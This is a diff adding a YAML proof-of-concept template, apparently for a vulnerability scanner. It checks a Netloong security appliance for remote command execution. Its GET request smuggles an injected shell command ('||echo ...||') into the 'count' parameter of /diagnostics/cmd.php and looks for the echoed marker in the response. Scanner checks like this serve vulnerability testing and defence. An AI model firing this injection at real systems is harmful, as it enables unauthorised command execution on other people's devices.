@@ -1,0 +1,18 @@
+name: poc-yaml-netloong-waf-rce
+manual: true
+transport: http
+rules:
+    net0:
+        request:
+            cache: true
+            method: GET
+            path: /diagnostics/cmd.php?action=ping&count=||echo%20Test^By^ZsfTest$1By$1Zsf||
+            headers:
+                Cache-Control: max-age=0
+        expression: response.status == 200 && response.body.bcontains(b"TestByZsf")
+expression: net0()
+detail:
+    author: fengyang(https://github.com/bigDevi1)
+    links:
+        - https://t.zsxq.com/6QJQbmq
+    description: 博华网龙信息安全一体机存在通用远程命令执行漏洞
